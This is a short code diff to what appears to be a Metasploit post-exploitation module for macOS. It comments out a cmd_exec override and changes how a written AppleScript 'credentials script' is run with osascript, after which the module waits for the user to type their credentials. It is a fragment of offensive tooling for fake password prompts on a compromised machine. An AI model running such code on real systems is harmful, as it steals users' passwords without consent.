@@ -58,10 +58,10 @@ class Metasploit3 < Msf::Post
     ], self.class)
   end
 
-  def cmd_exec(str)
-    print_status "Running cmd '#{str}'..."
-    super
-  end
+#  def cmd_exec(str, args)
+#    print_status "Running cmd '#{str} #{args}'..."
+#    super
+#  end
 
   # Run Method for when run command is issued
   def run
@@ -89,7 +89,7 @@ class Metasploit3 < Msf::Post
 
     # write the credentials script and run
     write_file(creds_osa,creds_script(pass_file))
-    cmd_exec("cat #{creds_osa} | osascript")
+    cmd_exec("osascript #{creds_osa}")
 
     print_status("Waiting for user '#{username}' to enter credentials...")
 
